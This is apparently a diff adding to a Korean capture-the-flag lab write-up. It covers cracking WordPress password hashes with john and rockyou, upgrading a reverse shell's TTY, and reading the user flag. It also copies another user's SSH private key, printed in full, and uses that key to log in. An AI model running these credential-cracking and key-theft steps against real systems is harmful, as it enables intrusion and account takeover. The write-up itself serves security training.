@@ -831,3 +831,221 @@ echo '$P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/' > think.hash
 echo '$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1' > gege.hash
 echo '$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1' > diego.hash
 echo '$P$BvcalhsCfVILp2SgttADny40mqJZCN/' > xavi.hash
+
+john --wordlist=/usr/share/wordlists/rockyou.txt think.hash
+
+# DONE (2025-07-26 07:21) 0g/s -> 0개 크랙됨
+
+─(root㉿docker-desktop)-[/]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt think.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 SSE2 4x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:10 1.33% (ETA: 07:21:56) 0g/s 22403p/s 22403c/s 22403C/s bossdog..betty77
+0g 0:00:00:11 1.46% (ETA: 07:21:55) 0g/s 22411p/s 22411c/s 22411C/s cumcum..clown13
+0g 0:00:11:46 DONE (2025-07-26 07:21) 0g/s 20302p/s 20302c/s 20302C/s !!!@@@!!!..\*7¡Vamos!
+Session completed.
+
+# john --wordlist=/usr/share/wordlists/rockyou.txt think.hash
+
+# 기본적으로 john 은 username:hash 로 인식하므로 형태 지키기
+
+cat <<'EOF' > users.hash
+think:$P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/
+gege:$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1
+diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
+xavi:$P$BvcalhsCfVILp2SgttADny40mqJZCN/
+EOF
+
+# john --wordlist=/usr/share/wordlists/rockyou.txt users.hash
+
+sandiegocalifornia (diego)
+
+# su diego -> 무반응 이슈
+
+# IP: 10.10.97.230
+
+### ✅ 원인: `su`는 **TTY (가상 터미널)** 가 필요합니다.
+
+- `su`는 **비밀번호 입력을 위해 /dev/tty 또는 stdin이 TTY인지 검사**합니다.
+- 리버스 쉘은 기본적으로 TTY가 **없기 때문에**, 비밀번호 입력 처리를 못 해서 **그냥 멈춰있는 것처럼 보입니다.**
+
+### ✔️ 1. Python을 통한 TTY 업그레이드
+
+리버스 쉘에서 아래 명령어를 실행:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+---
+
+### ✔️ 2. `stty` 오류 방지 (선택)
+
+```bash
+export TERM=xterm
+```
+
+---
+
+### ✔️ 3. 백그라운드로 전환 후 `fg`로 복원 (netcat일 경우에만)
+
+1. 백그라운드 전환:
+   Ctrl+Z
+
+2. 터미널 로 설정:
+
+```bash
+stty raw -echo
+```
+
+3. 복귀:
+
+```bash
+fg
+```
+
+4. 다시 Enter 키 누르기
+
+이제 `su diego` 하면 비밀번호 입력 프롬프트가 잘 뜨고 정상 작동할 수 있습니다.
+
+---
+
+## 🔁 대안: SSH로 직접 접속 (더 안정적)
+
+이미 `sandiegocalifornia` 비밀번호를 알아냈고, 사용자가 존재한다면 아래처럼 직접 SSH 로그인하는 게 더 좋습니다:
+
+```bash
+ssh diego@10.10.97.230
+# 비밀번호: sandiegocalifornia
+```
+
+## SSH가 안 되고 리버스 쉘만 있다면 위에서 소개한 TTY 업그레이드를 반드시 적용해야 합니다.
+
+www-data@ip-10-10-97-230:/var/www/wordpress/wp-admin$ su diego
+Password:
+diego@ip-10-10-97-230:/var/www/wordpress/wp-admin$ id
+uid=1002(diego) gid=1002(diego) groups=1002(diego),1005(internal)
+diego@ip-10-10-97-230:/var/www/wordpress/wp-admin$
+
+diego@ip-10-10-97-230:/home$ cd diego/
+diego@ip-10-10-97-230:~$ ls
+user.txt
+diego@ip-10-10-97-230:~$ cat user.txt
+45edaec653ff9ee06236b7ce72b86963
+diego@ip-10-10-97-230:~$
+
+diego@ip-10-10-97-230:~$ ls ../gege
+wordpress.old.zip
+diego@ip-10-10-97-230:~$ ls ../ssm-user/
+diego@ip-10-10-97-230:~$ ls -al ../ssm-user/
+total 20
+drwxr-xr-x 2 ssm-user ssm-user 4096 Jul 20 11:11 .
+drwxr-xr-x 8 root root 4096 Jul 26 05:28 ..
+-rw-r--r-- 1 ssm-user ssm-user 220 Jan 12 2024 .bash_logout
+-rw-r--r-- 1 ssm-user ssm-user 3771 Jan 12 2024 .bashrc
+-rw-r--r-- 1 ssm-user ssm-user 807 Jan 12 2024 .profile
+diego@ip-10-10-97-230:~$ ls -al ../think/
+total 32
+drwxr-x--- 5 think internal 4096 Jan 12 2024 .
+drwxr-xr-x 8 root root 4096 Jul 26 05:28 ..
+lrwxrwxrwx 1 root root 9 Jun 21 2023 .bash_history -> /dev/null
+-rw-r--r-- 1 think think 220 Jun 2 2023 .bash_logout
+-rw-r--r-- 1 think think 3771 Jun 2 2023 .bashrc
+drwx------ 2 think think 4096 Jan 12 2024 .cache
+drwx------ 3 think think 4096 Aug 18 2023 .gnupg
+-rw-r--r-- 1 think think 807 Jun 2 2023 .profile
+drwxr-xr-x 2 think think 4096 Jun 21 2023 .ssh
+lrwxrwxrwx 1 root root 9 Aug 18 2023 .viminfo -> /dev/null
+diego@ip-10-10-97-230:~$ cd ../think
+diego@ip-10-10-97-230:/home/think$ ls
+diego@ip-10-10-97-230:/home/think$ cd .ssh
+diego@ip-10-10-97-230:/home/think/.ssh$ ls
+authorized_keys id_rsa id_rsa.pub
+diego@ip-10-10-97-230:/home/think/.ssh$ cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+diego@ip-10-10-97-230:/home/think/.ssh$
+
+# IP: 10.10.97.230 -> SSH
+
+┌──(root㉿docker-desktop)-[/]
+└─# ssh -i id_rsa.pem think@10.10.97.230
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@ WARNING: UNPROTECTED PRIVATE KEY FILE! @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0644 for 'id_rsa.pem' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "id_rsa.pem": bad permissions
+think@10.10.97.230: Permission denied (publickey).
+
+# ssh -i id_rsa.pem think@10.10.97.230 -> SSH 접속 성공
+
+┌──(root㉿docker-desktop)-[/]
+└─# chmod 700 id_rsa.pem
+
+┌──(root㉿docker-desktop)-[/]
+└─# ssh -i id_rsa.pem think@10.10.97.230
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
+
+- Documentation: https://help.ubuntu.com
+- Management: https://landscape.canonical.com
+- Support: https://ubuntu.com/pro
+
+System information as of Sat 26 Jul 2025 07:58:14 AM UTC
+
+System load: 0.0 Processes: 144
+Usage of /: 70.1% of 9.75GB Users logged in: 0
+Memory usage: 19% IPv4 address for ens5: 10.10.97.230
+Swap usage: 0%
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+0 updates can be applied immediately.
+
+37 additional security updates can be applied with ESM Infra.
+Learn more about enabling ESM Infra service for Ubuntu 20.04 at
+https://ubuntu.com/20-04
+
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+
+think@ip-10-10-97-230:~$
